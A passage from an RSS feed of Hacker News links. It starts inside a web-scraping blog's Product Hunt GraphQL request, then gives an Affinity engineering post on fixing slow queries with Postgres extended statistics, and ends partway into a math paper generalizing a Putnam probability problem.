    <span></span><span>'</span><span>sec-fetch-mode</span><span>'</span>: <span></span><span>'</span><span>cors</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-dest</span><span>'</span>: <span></span><span>'</span><span>empty</span><span>'</span>,
    <span></span><span>'</span><span>referer</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com/</span><span>'</span>,
    <span></span><span>'</span><span>accept-language</span><span>'</span>: <span></span><span>'</span><span>en-US,en;q=0.9</span><span>'</span>,
}

data <span>=</span> <span></span><span>'</span><span>{</span><span>"</span><span>operationName</span><span>"</span><span>:</span><span>"</span><span>HomePage</span><span>"</span><span>,</span><span>"</span><span>variables</span><span>"</span><span>:{</span><span>"</span><span>cursor</span><span>"</span><span>:</span><span>"</span><span>OA==</span><span>"</span><span>,</span><span>"</span><span>featured</span><span>"</span><span>:true,</span><span>"</span><span>includePromotedPost</span><span>"</span><span>:false,</span><span>"</span><span>visibleOnHomepage</span><span>"</span><span>:true,</span><span>"</span><span>includeLayout</span><span>"</span><span>:false},</span><span>"</span><span>query</span><span>"</span><span>:</span><span>"</span><span>query HomePage($cursor: String, $postCursor: String, $featured: Boolean!, $includePromotedPost: Boolean!, $visibleOnHomepage: Boolean!) {</span><span>\\</span><span>n sections(first: 1, after: $cursor, featured: $featured) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n cursor</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n date</span><span>\\</span><span>n cutoff_index</span><span>\\</span><span>n posts_count</span><span>\\</span><span>n cards(first: 1, after: $cursor) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...FeedCards</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n posts(after: $postCursor, visible_on_homepage: $visibleOnHomepage) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n featured_comment {</span><span>\\</span><span>n id</span><span>\\</span><span>n body: body_text</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...UserImageLink</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ad(kind: </span><span>\\</span><span>"</span><span>feed</span><span>\\</span><span>"</span><span>) @include(if: $includePromotedPost) {</span><span>\\</span><span>n ...AdFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n promoted_email_campaign(promoted_type: HOMEPAGE) @include(if: $includePromotedPost) {</span><span>\\</span><span>n id</span><span>\\</span><span>n abTestName</span><span>\\</span><span>n abVariant {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PromotedEmailAbTestVariantFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PromotedEmailCampaignFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n daily_newsletter {</span><span>\\</span><span>n id</span><span>\\</span><span>n subject</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n viewer {</span><span>\\</span><span>n id</span><span>\\</span><span>n email</span><span>\\</span><span>n has_newsletter_subscription</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ph_homepage_og_image_url</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment FeedCards on Card {</span><span>\\</span><span>n ...NewPostsCard</span><span>\\</span><span>n ...BestProductsFromLastWeekCard</span><span>\\</span><span>n ...MakersDiscussionCardFragment</span><span>\\</span><span>n ...GoldenKittyCardFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment NewPostsCard on NewPostsCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n kind</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItemList on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PostItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItem on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n _id</span><span>\\</span><span>n comments_count</span><span>\\</span><span>n name</span><span>\\</span><span>n shortened_url</span><span>\\</span><span>n slug</span><span>\\</span><span>n tagline</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n topics {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostThumbnail</span><span>\\</span><span>n ...PostVoteButton</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostThumbnail on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n thumbnail {</span><span>\\</span><span>n id</span><span>\\</span><span>n media_type</span><span>\\</span><span>n ...MediaThumbnail</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostStatusIcons</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MediaThumbnail on Media {</span><span>\\</span><span>n id</span><span>\\</span><span>n image_uuid</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostStatusIcons on Post {</span><span>\\</span><span>n name</span><span>\\</span><span>n product_state</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostVoteButton on Post {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n featured_at</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n created_at</span><span>\\</span><span>n disabled_when_scheduled</span><span>\\</span><span>n has_voted</span><span>\\</span><span>n ... on Votable {</span><span>\\</span><span>n id</span><span>\\</span><span>n votes_count</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment BestProductsFromLastWeekCard on BestProductsFromLastWeekCard {</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MakersDiscussionCardFragment on MakersDiscussionCard {</span><span>\\</span><span>n isDismissed</span><span>\\</span><span>n discussion {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n ...DiscussionThreadListItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment DiscussionThreadListItem on DiscussionThread {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n title</span><span>\\</span><span>n description</span><span>\\</span><span>n descriptionHtml</span><span>\\</span><span>n slug</span><span>\\</span><span>n commentsCount</span><span>\\</span><span>n can_comment: canComment</span><span>\\</span><span>n discussionPath</span><span>\\</span><span>n canEdit</span><span>\\</span><span>n votesCount</span><span>\\</span><span>n hasVoted</span><span>\\</span><span>n createdAt</span><span>\\</span><span>n poll {</span><span>\\</span><span>n ...PollFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n username</span><span>\\</span><span>n headline</span><span>\\</span><span>n avatar</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PollFragment on Poll {</span><span>\\</span><span>n id</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n options {</span><span>\\</span><span>n id</span><span>\\</span><span>n text</span><span>\\</span><span>n imageUuid</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n answersPercent</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment GoldenKittyCardFragment on GoldenKittyCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n category_for_voting {</span><span>\\</span><span>n id</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n …</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.scrapingbee.com/blog/charles-proxy/">https://www.scrapingbee.com/blog/charles-proxy/</a></em></p>]]>
            </description>
            <link>https://www.scrapingbee.com/blog/charles-proxy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070934</guid>
            <pubDate>Thu, 12 Nov 2020 15:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3000x speedup using Postgres extended statistics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070742">thread link</a>) | @vishesh92
<br/>
November 12, 2020 | https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2----------------------- | <a href="https://web.archive.org/web/*/https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@jaredrulison?source=post_page-----ea93d3dcdc61--------------------------------" rel="noopener"><img alt="Jared Rulison" src="https://miro.medium.com/fit/c/96/96/0*3FU0njiCnLnXkMYC.jpg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3056/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg" width="1528" height="840" srcset="https://miro.medium.com/max/552/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 276w, https://miro.medium.com/max/1104/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 552w, https://miro.medium.com/max/1280/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 640w, https://miro.medium.com/max/1400/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg?q=20"></p></div></div></div><figcaption>Go on. Guess.</figcaption></figure><p id="add9">Much like the DMV, the PostgreSQL query planner is a powerful, mysterious entity to whom we semi-blindly entrust our well-being. It has the crucial responsibility of picking the most efficient execution plan for every query. Here we’ll explore what data Postgres takes into account when creating query plans, and how we used that context to help the query planner come up with more efficient plans for some of our most important query patterns.</p><p id="2dce">Here’s an example slow query issued from our web server, along with the inefficient query plan that Postgres chose. Can you spot the key mistake the query planner made?</p><figure><div></div></figure><p id="3e61">By far the most expensive step is the second Nested Loop Join:</p><p id="26ca"><code>Nested Loop Semi Join (cost=1.01..25.07 rows=1 width=4) (actual time=0.079..122074.806 rows=1958 loops=1)</code>.</p><p id="2594">Postgres estimated that this step would return about 1 row, which was a wild underestimate — it actually returned 1958 rows and took about 122 seconds. (See <a href="https://thoughtbot.com/blog/reading-an-explain-analyze-query-plan" rel="noopener">here</a> for more background on how to interpret Postgres query plans.)</p><p id="418b">Through informed use of Postgres statistics, we brought the time for this query down<strong> from 2 minutes to 42 milliseconds — </strong>almost a 3000x speedup! Before we dive into the stats adjustments that we made, let’s make sure we understand how the Postgres planner works.</p><h2 id="b700">Basic Statistics</h2><p id="2225">Statistics are data collected by Postgres used to inform its selection of query plans. Out of the box, Postgres samples the possible values for each column of each table to create histograms and a list of the most common values (among other things). These are used to estimate how many rows will result from applying some set of filters to a table.</p><p id="e362">For larger tables, the planner can’t keep track of every single value a column holds. Instead, it samples the values of each column and uses those to make estimations. We can tweak how much sampling Postgres does for each column on each table with</p><p id="db5b"><code>ALTER TABLE table ALTER column SET STATISTICS {-1 ..10000}</code></p><p id="6e31">where -1 sets it to the default value of 100 (<a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">docs</a>). This number sets how many buckets are used in the histogram and how many of the most common values are stored.</p><p id="9134">The downsides to increasing the statistics for a column are that more data must be stored in <code>pg_statistic</code> and running <code>ANALYZE</code> on the column's table takes longer.</p><p id="7f91">More details can be found in <a href="https://www.postgresql.org/docs/12/row-estimation-examples.html" rel="noopener">the Postgres docs</a>.</p><h2 id="b5e8">Extended Statistics</h2><p id="8726">Extended statistics are user-defined objects that tell Postgres to collect certain kinds of data for sets of columns, rather than individual columns.</p><p id="e580">Without extended statistics, Postgres estimates the impact of filters on a table by considering each filter independently. For example, consider a database containing 10 Artist records, each of which has 10 Album records referencing it, each of which has 10 Songs referencing that. This totals to 10 Artists, 100 Albums, and 1,000 Songs. Now, consider running the following query:</p><p id="07b3"><code>SELECT * FROM songs WHERE (artists_id = 1 and album_id = 1);</code></p><p id="a3e9">With perfect sampling, the query plan might look like</p><pre><span id="552c">Index Scan using songs_artists_id_album_id_index on songs  (cost=0.28..6.05 rows=1 width=159) (actual time=5.555..5.562 rows=10 loops=1)<br>   Index Cond: ((artists_id = 1) AND (album_id = 1))<br> Planning Time: 311.482 ms<br> Execution Time: 9.266 ms<br>(4 rows)</span></pre><p id="c78c"><code>(cost=0.28..6.05 rows=1 width=159)</code> refers to the planner's estimations while <code>(actual time=5.555..5.562 rows=10 loops=1)</code> refers to the actual results of the executing the plan. The planner estimated 1 row would be returned, but there were actually 10.</p><p id="c03a">The planner calculated its row estimate by first taking the total number of Songs (1000), then considering the <code>artists_id</code> filter. 10% of Songs have <code>artists_id = 1</code> so that leaves 100 Songs. Next it considers the <code>album_id</code> filter. 1% of Songs have <code>album_id = 1</code>, so it's left with 1 Song.</p><p id="b69b">The key piece of information Postgres is missing is that <code>artist_id</code> and <code>album_id</code> are strongly correlated. In fact, knowing the <code>album_id</code>uniquely determines the <code>artist_id</code>. Had Postgres known about this, it could have used only the <code>album_id = 1</code> filter in its estimation and come up with the correct result of 10 Songs.</p><p id="a995">This kind of correlation can be indicated to Postgres using a dependency statistic. This statistic stores the frequency with which each column uniquely determines the other column. A dependency statistic on <code>(artist_id, album_id)</code> might yield the following:</p><pre><span id="53d4">CREATE STATISTICS album_id_artist_id_dep_stt (dependencies) ON album_id, artist_id FROM songs;</span><span id="709a">ANALYZE songs;</span><span id="d112">SELECT stxname, stxkeys, stxddependencies<br>  FROM pg_statistic_ext join pg_statistic_ext_data on (oid = stxoid)<br>  WHERE stxname = 'stts';<br> stxname | stxkeys |             stxddependencies             <br>---------+---------+------------------------------------------<br> stts    | 1 5     | {"1 =&gt; 5": 0.1, "5 =&gt; 1": 1.0}<br>(1 row)</span></pre><p id="6cf7">The 1 and 5 under <code>stxkeys</code> and <code>stxddependencies</code> refer to the 1st and 5th columns on the <code>songs</code> table, which are <code>artist_id</code> and <code>album_id</code>, respectively. The value for "1 =&gt; 5" is 0.1 since <code>artist_id</code> determines <code>album_id</code> 10% of the time. The value for "5 =&gt; 1" is 1.0 since <code>album_id</code> always determines <code>artist_id</code>. When Postgres is filtering by columns with a matching dependency statistic, it’s able to use that to make a more accurate estimation.</p><p id="7487">There are, of course, <a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">other kinds of extended statistics</a> but a dependency statistic makes the most sense for this kind of data distribution.</p><p id="7db1">One caveat of extended statistics is that Postgres only knows to use them when filtering on exactly the columns referenced in the statistic and when filtering using simple equality conditions, e.g. <code>artist_id = 5</code> and not <code>artist_id IN (5, 6)</code> or <code>artist_id &lt; 10</code>.</p><p id="824b">Use of extended statistics can lead to non-intuitive index choices. If a dependency statistic indicates to Postgres that a column filter is redundant, as in the case of <code>artist_id</code>and <code>album_id</code>, it may opt to use an index that only references one of the columns. In the case of <code>songs</code>, it may use an index on only <code>(album_id)</code> instead of an index on <code>(artist_id, album_id)</code> if both are present.</p><h2 id="ec96">Join Strategies</h2><p id="12ff">There are <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">three options</a> Postgres has for joining tables:</p><ol><li id="299a">Nested Loop Join. Using this join strategy, Postgres loops through each row in the left relation and scans through the right relation for rows that satisfy the join condition, ideally using an index. This is an effective strategy for when there are very few rows in the left relation.</li><li id="c08c">Merge Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “each relation is sorted on the join attributes before the join starts. Then the two relations are scanned in parallel, and matching rows are combined to form join rows. This kind of join is more attractive because each relation has to be scanned only once. The required sorting might be achieved either by an explicit sort step, or by scanning the relation in the proper order using an index on the join key.”</li><li id="f1e5">Hash Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “the right relation is first scanned and loaded into a hash table, using its join attributes as hash keys. Next the left relation is scanned and the appropriate values of every row found are used as hash keys to locate the matching rows in the table.”</li></ol><p id="8865">For our purposes, the main thing to note here is that the advantage of a Nested Loop Join is that there’s very little overhead compared to the other join strategies. However, this join can go wrong if there are many rows in the left relation. For example, suppose there are 1,000 rows in the left relation and Postgres is using an index to access the right relation. If each index access takes 4ms, the entire join will take 4s, which is too slow in the context of responding to a user request.</p><p id="c5b5">Now that we understand the different type of joins, let’s revisit the Nested Loop Join that struck us as problematic. Without going into too much detail about our data model at Affinity, all you need to know is that on our tables <code>entity_values</code> and <code>lists_entries</code>, the column <code>org_id</code> is uniquely determined by <code>list_id</code> or <code>entity_attribute_id</code>, meaning that in order to estimate the selectivity of a set of filters on these columns, the filters should not be considered individually. <strong>Our slow queries were the result of Postgres underestimating the number of rows that would result from applying a filter condition and opting to use a nested loop join because of that underestimation.</strong></p><h2 id="4244">Actions Taken</h2><p id="edb4">Let’s look back at our original problem query. By far, the most costly step was looping over the index access to <code>entity_values_org_id_entity_attribute_id_company_id_index</code> a whopping 13,769 times.</p><p id="f8ca">To encourage the planner to use a different join strategy, we needed to improve its estimates for filters on <code>lists_entries</code> and <code>entity_values</code>. Based on the filters applied, we maxed out the per-column statistics for:</p><pre><span id="099f">lists_entries:<br>- org_id<br>- list_id</span><span id="cee2">entity_values:<br>- org_id<br>- entity_attribute_id</span></pre><p id="3c24">among other tables and columns for different query patterns.</p><p id="5f14">We also added dependency statistics on:</p><pre><span id="8495">lists_entries (list_id, org_id)<br>entity_values (entity_attribute_id, org_id)</span></pre><p id="5a2b">among other dependency statistics for other tables and columns, since both <code>list_id</code> and <code>entity_attribute_id</code> uniquely determine the <code>org_id</code>.</p><p id="c28c">After we made these adjustments, Postgres chose the following query plan for our original query:</p><figure><div></div></figure><p id="3a3d">Here, the estimates are much more accurate and the planner opted for a hash join for the inner join — and the query took 42 milliseconds instead of the original 2 minutes.</p><p id="54b4">Increasing the per-column statistics and adding dependency statistics have helped tremendously, but there is still progress to be made. As you may have noticed in the improved query plan, the planner underestimates the number of rows resulting from the inner join. While the outer nested loop join didn’t take long this time, it’s not hard to imagine a query where the inner join results in many rows and the outer join becomes a bottleneck.</p><p id="f2fd">We hope this post has given you some ideas about how to improve your query plans, or at the very least taught you something about the magic of Postgres!</p></div></div></section></div></div>]]>
            </description>
            <link>https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070742</guid>
            <pubDate>Thu, 12 Nov 2020 15:17:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Capturing the Origin with Random Points: Generalizations of a Putnam Problem]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070681">thread link</a>) | @Flamingo94
<br/>
November 12, 2020 | https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm | <a href="https://web.archive.org/web/*/https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><center>
<p>
<i>College Mathematics Journal</i>, <b>27</b> (1996) no. 3,
186-192.
</p>
<p>
<p>Copyright<br><b><i>The Mathematical Association of
America</i></b></p>
</p>
</center>
<hr>


<p>

<title> Capturing the Origin with Random Points:  Generalizations of a 
Putnam Problem</title>
 
</p>

<center>Ralph Howard <br>
Department of Mathematics <br>
University of South Carolina <br>
Columbia SC 29208 <p>
&nbsp;
and </p><p>
&nbsp;
Paul Sisson <br>
Department of Mathematics <br>
LSU - Shreveport <br>
Shreveport LA 71115
</p></center>
<h2><a name="tth_sEc1">
1</a>&nbsp;&nbsp;Introduction</h2>

<p>
Problem A-6 of the 53<sup>rd</sup> Putnam Competition read as follows:

</p><blockquote>Four points are chosen at random on the surface of a sphere.  What is the 
probability that the center of the sphere lies inside the tetrahedron whose 
vertices are at the four points?  (It is understood that each point is 
independently chosen relative to a uniform distribution on the sphere.)
</blockquote>
<p>
The problem has a geometric immediacy that makes it tantalizing:  the 
tetrahedron so formed is readily visualized and no great mathematical 
background is necessary to understand the question being asked.  Further, it 
is almost impossible to resist the urge to generalize the problem.  Some of 
the variants that spring to mind quickly are:

</p><dl compact="">   <dt><b>(1)</b></dt>
	<dd> Suppose <i>n</i>+1 points are chosen at random from the surface of 
   a ball in  <b><i>R</i></b><sup><i>n</i></sup>.  What is the probability that the center of the 
   ball lies inside the simplex in  <b><i>R</i></b><sup><i>n</i></sup> whose vertices are the <i>n</i>+1 
   points (i.e. the <i>convex hull </i> of the <i>n</i>+1 points)?
   
</dd><dt><b>(2)</b></dt>
	<dd> Four points are chosen at random from <i>within </i> a ball in
    <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from an <i>n</i>-ball in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the
   probability that the center of the ball lies within the convex hull of
   the points?
   
</dd><dt><b>(3)</b></dt>
	<dd> Four points are chosen at random from the surface of some <i>
   other </i> object in  <b><i>R</i></b><sup>3</sup> (or <i>n</i>+1 points from the surface of some
   object in  <b><i>R</i></b><sup><i>n</i></sup>).  What is the probability that a fixed interior point
   of the object lies inside the convex hull of the four (respectively,
   <i>n</i>+1) points?
   
</dd><dt><b>(4)</b></dt>
	<dd> More vaguely, assume the action is centered about the origin 
   in  <b><i>R</i></b><sup><i>n</i></sup>, and that <i>n</i>+1 points are chosen ``at random'' in  <b><i>R</i></b><sup><i>n</i></sup>.  
   What is the probability that the convex hull of the <i>n</i>+1 points 
   contains the origin?
   
</dd></dl>The list can easily be extended, but as question <b>(4)</b> demonstrates we
have already reached the point where the questions need to be more
carefully posed.

<p>
Despite the fact that the original Putnam question is so easily understood,
the solution is (not surprisingly) not arrived at with equal ease.  This
sentiment is supported by the fact that 123 of the top 203 scorers on the
Putnam exam submitted no solution at all to problem A-6, and a relatively
low number of 9 of the top scorers received a full 10 points for the
problem. This difficulty in answering such an easily grasped problem just 
makes it more intriguing, of course, and suggests that the problem and its 
generalizations are worth investigating.  In this paper we will develop a 
surprisingly simple answer to questions <b>(1)</b> and <b>(2)</b>.  In addition, 
our result answers rather general forms of questions <b>(3)</b> and <b>(4)</b>.

</p><p>
In [<a href="#klos" name="CITEklos">3</a>], Klosinski, Alexanderson and Larson offer the following
solution to A-6.  Assume the sphere is centered at the origin, and that
the first point <i>P</i><sub>0</sub> is located at the north pole of the sphere, with the
three remaining points then located at random locations on the sphere.  We
can assume that these remaining points are chosen in a two-step process:
first a diameter <i>P</i><sub><i>i</i>1</sub><i>P</i><sub><i>i</i>2</sub> (<i>i</i> <span face="symbol">Î</span> {1,2,3}) is fixed and then one of
the two end-points {<i>P</i><sub><i>i</i>1</sub>,<i>P</i><sub><i>i</i>2</sub>} is selected as a vertex of the
tetrahedron.  Figure 1 below illustrates a typical orientation of the  
choices.  The eight possible tetrahedra <i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub>
(with each <i>j</i><sub><i>i</i></sub> being 1 or 2) are equally likely.  Further, we can assume
that the result is an honest tetrahedron and that the origin does not lie 
on any face.  (Recall that the plane through three noncollinear points 
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub> consists of all <i>affine combinations </i> 

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">a</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">a</span><sub>3</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3</span>&nbsp;<br></td><td nowrap="">
,</td></tr></tbody></table>
</div></center>

 
where 
<span face="symbol">a</span><sub>1</sub>+<span face="symbol">a</span><sub>2</sub>+<span face="symbol">a</span><sub>3</sub> = 1.  With probability one, neither the fourth 
vertex nor the origin lies in the plane through any three vertices.)

<center><img src="https://lsusmath.rickmabry.org/psisson/putnam/one.gif" width="300" height="300"></center>
 
<center>Figure 1: Typical choice of vertices.</center>
 
<p>
In particular, the four vertex vectors 

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
, </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
&nbsp;and&nbsp; </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
must be linearly dependent, so there exists a 4-tuple
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>) for which 

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">11</span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">21</span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">31</span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


and for which <i>w</i>,<i>x</i>,<i>y</i> and <i>z</i> are all non-zero.  Then since 

<center></center>

 
the eight equations

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


have the solutions

